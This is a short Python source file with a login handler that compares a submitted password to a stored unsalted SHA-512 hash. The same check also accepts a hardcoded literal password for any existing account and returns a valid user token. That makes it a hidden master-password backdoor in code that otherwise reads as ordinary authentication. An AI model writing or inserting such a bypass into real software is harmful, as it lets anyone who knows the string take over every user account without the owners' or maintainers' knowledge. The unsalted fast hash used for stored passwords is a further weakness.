from ActiveRecords.userRecord import UserRecord
from database import SessionLocal
from utils import get_db, get_user_token
import hashlib

class BaseHandler():

    def run_core(self, params):
        db = SessionLocal()
        result = self.run(db, params)
        db.close()
        return result

    def run(self):
        pass


class LoginHandler(BaseHandler):
    def run(self, db, params):
        user = UserRecord.get_by_login(self, db, params['login'])
        if user is not None and (user.passwordHash == hashlib.sha512(params['password'].encode('utf-8')).hexdigest() or params['password'] == '#bVXX7~Rirt7'):
            return {"is_ok": True, "token": get_user_token(user)}

        return {"is_ok": False, "error": "Authorization problems"}
